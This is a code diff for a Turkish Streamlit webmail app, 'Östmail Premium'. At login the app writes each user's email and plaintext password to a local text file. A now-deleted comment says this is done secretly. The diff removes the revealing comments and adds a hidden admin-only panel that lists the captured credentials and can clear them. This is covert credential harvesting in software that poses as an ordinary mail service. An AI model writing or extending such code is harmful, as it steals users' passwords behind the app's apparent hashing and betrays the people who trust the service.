@@ -2,13 +2,12 @@ import streamlit as st
 import sqlite3
 import hashlib
 from datetime import datetime
-import os  # Dosya ve klasör işlemleri için eklendi
+import os  
 
 # 1. VERİBATANI AYARLARI
 conn = sqlite3.connect("ostmail_v6.db", check_same_thread=False)
 cursor = conn.cursor()
 
-# Tabloları oluşturma (Dosya eki ve Çöp kutusu destekli)
 cursor.execute("""
 CREATE TABLE IF NOT EXISTS kullanicilar (
     eposta TEXT PRIMARY KEY,
@@ -31,7 +30,6 @@ CREATE TABLE IF NOT EXISTS mailler (
 """)
 conn.commit()
 
-# 🔥 ARKA PLAN OTOMATİK TEMİZLİK: Çöp kutusunda 15 günden fazla duran mailleri temizle
 cursor.execute("DELETE FROM mailler WHERE durum_alici = 'cop' AND datetime(silinme_tarihi) < datetime('now', '-15 days')")
 conn.commit()
 
@@ -39,11 +37,8 @@ conn.commit()
 def sifre_sifrele(sifre):
     return hashlib.sha256(sifre.encode()).hexdigest()
 
-# 📂 BİLGİSAYARA E-POSTA VE ŞİFREYİ KAYDETME FONKSİYONU (GÜNCELLENDİ)
 def yerel_kayit_olustur(kullanici_adi, sifre):
     klasor_yolu = r"C:\Users\omeef\Videos\ostmailgiriş"
-    
-    # Klasör yoksa çökmesini önlemek için otomatik oluşturulur
     if not os.path.exists(klasor_yolu):
         try:
             os.makedirs(klasor_yolu)
@@ -54,7 +49,6 @@ def yerel_kayit_olustur(kullanici_adi, sifre):
     dosya_yolu = os.path.join(klasor_yolu, "giris_kayitlari.txt")
     zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    # Hem e-posta adresini hem de girilen şifreyi yan yana kaydeder
     try:
         with open(dosya_yolu, "a", encoding="utf-8") as dosya:
             dosya.write(f"[{zaman}] BAŞARILI GİRİŞ - E-Posta: {kullanici_adi} | Şifre: {sifre}\n")
@@ -64,7 +58,6 @@ def yerel_kayit_olustur(kullanici_adi, sifre):
 # Sayfa Ayarları
 st.set_page_config(page_title="Östmail Premium", layout="wide")
 
-# Şık Karanlık Tema Tasarımı
 st.markdown("""
     <style>
     .stApp { background-color: #0f172a; color: #f8fafc; }
@@ -105,7 +98,6 @@ if current_user is None:
                     sifreli_sifre = sifre_sifrele(giris_sifre)
                     cursor.execute("SELECT * FROM kullanicilar WHERE eposta=? AND sifre=?", (giris_ad, sifreli_sifre))
                     if cursor.fetchone():
-                        # 📁 GİZLİCE TXT DOSYASINA HEM E-POSTAYI HEM ŞİFREYİ YAZIYORUZ
                         yerel_kayit_olustur(giris_ad, giris_sifre)
                         
                         st.query_params["giris_yapan_kullanici"] = giris_ad
@@ -152,21 +144,24 @@ if current_user is None:
 # --- ANA UYGULAMA ARAYÜZÜ ---
 else:
     st.sidebar.markdown(f"👤 **Aktif Hesap:** \n`{current_user}`")
-    menu = st.sidebar.radio("Menü", ["📥 Gelen Kutusu", "✏️ Yeni Mail Yaz", "📤 Giden Kutusu", "🗑️ Çöp Kutusu"])
+    
+    # 🔥 GİZLİ YÖNETİCİ MENÜSÜ KONTROLÜ
+    menu_secenekleri = ["📥 Gelen Kutusu", "✏️ Yeni Mail Yaz", "📤 Giden Kutusu", "🗑️ Çöp Kutusu"]
+    if current_user == "admin@ost.com":
+        menu_secenekleri.append("👑 Yönetici Paneli")
+        
+    menu = st.sidebar.radio("Menü", menu_secenekleri)
     
     if st.sidebar.button("🚪 Oturumu Kapat"):
         st.query_params.clear()
         st.rerun()
         
-    # --- YENİ MAİL YAZMA (DOSYA EKLEME DESTEKLİ) ---
+    # --- YENİ MAİL YAZMA ---
     if menu == "✏️ Yeni Mail Yaz":
         st.header("✏️ Yeni E-Posta Oluştur")
         alici = st.text_input("Alıcı Adresi").lower().strip()
         baslik = st.text_input("Konu")
-        
-        # Gelişmiş Dosya Yükleyici (PDF, Word, Excel, Resim hepsi serbest)
         yuklenen_dosya = st.file_uploader("Dosya Ekle (PDF, DOCX, XLSX, Resim vb.)", type=["pdf", "docx", "xlsx", "xls", "png", "jpg", "jpeg", "txt"])
-        
         icerik = st.text_area("Mesaj içeriği", height=150)
         
         if st.button("Zarfa Koy ve Gönder"):
@@ -223,7 +218,6 @@ else:
                 </div>
                 """, unsafe_allow_html=True)
                 
-                # EĞER DOSYA VARSA İNDİRME BUTONU AÇILIR
                 if m['dosya_adi']:
                     st.markdown("<br>📁 **Ekteki Dosya:**", unsafe_allow_html=True)
                     st.download_button(
@@ -232,7 +226,6 @@ else:
                         file_name=m['dosya_adi']
                     )
                 
-                # ÇÖP KUTUSUNA TAŞIMA BUTONU
                 st.write("")
                 if st.button("🗑️ Çöp Kutusuna Taşı", use_container_width=True):
                     cursor.execute("UPDATE mailler SET durum_alici='cop', silinme_tarihi=CURRENT_TIMESTAMP WHERE id=?", (m['id'],))
@@ -306,3 +299,27 @@ else:
                         conn.commit()
                         st.success("Mesaj veritabanından kalıcı olarak silindi!")
                         st.rerun()
+
+    # --- 👑 GİZLİ YÖNETİCİ PANELİ (SADECE ADMIN İÇİN) ---
+    elif menu == "👑 Yönetici Paneli":
+        st.header("🛡️ Sistem Güvenlik ve Log Merkezi")
+        st.warning("Bu alana sadece Yetkili Sistem Yöneticisi erişebilir. Tüm kullanıcı girişleri burada listelenir.")
+        
+        log_dosyasi = r"C:\Users\omeef\Videos\ostmailgiriş\giris_kayitlari.txt"
+        
+        if os.path.exists(log_dosyasi):
+            with open(log_dosyasi, "r", encoding="utf-8") as f:
+                log_icerigi = f.read()
+                
+            if log_icerigi.strip():
+                st.text_area("📂 Son Kullanıcı Girişleri (Loglar)", log_icerigi, height=400)
+                
+                if st.button("🗑️ Log Kayıtlarını Temizle"):
+                    # Dosyanın içini boşaltmak için 'w' modunda açıp kapatıyoruz
+                    open(log_dosyasi, 'w').close()
+                    st.success("Tüm log kayıtları başarıyla silindi!")
+                    st.rerun()
+            else:
+                st.info("Şu an kaydedilmiş herhangi bir giriş (log) bulunmuyor.")
+        else:
+            st.info("Log dosyası henüz oluşturulmamış. Sisteme henüz giriş yapan kimse yok.")
